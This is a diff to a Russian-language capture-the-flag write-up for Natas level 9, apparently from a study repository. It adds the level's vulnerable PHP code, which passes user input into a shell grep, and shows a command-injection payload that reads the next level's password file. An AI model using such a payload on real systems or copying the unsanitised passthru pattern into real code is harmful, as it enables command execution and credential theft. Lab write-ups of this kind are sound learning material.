@@ -18,15 +18,28 @@
 ![Скриншот веб-приложения](./img/natas9/natas9_1.png)
 
 Кнопка <kbd>**View sourcecode**</kbd> позволяет просмотреть исходный код страницы
-![Скриншот исходного кода](./img/natas9/natas9_2.png)
+```php
+// HTML Code ...
+<?
+$key = "";
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
 
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+// HTML Code ...
+```
 ## Решение
 <a name="Решение"></a>
-В исходном коде веб-приложения видим команду, которая выполняет поиск по вводимому пользователем слову
-![Команда поиска](img/natas9/natas9_3.png)
+В исходном коде веб-приложения видим команду, которая выполняет поиск по вводимому пользователем слову  
+```php
+passthru("grep -i $key dictionary.txt");
+```
 
 Выводим флаг от этой лабораторки при помощи уязвимости Command Injection  
-
 :space_invader: Payload: ``; cat /etc/natas_webpass/natas10; # ``  
 
 ![Получение флага](img/natas9/natas9_4.png)
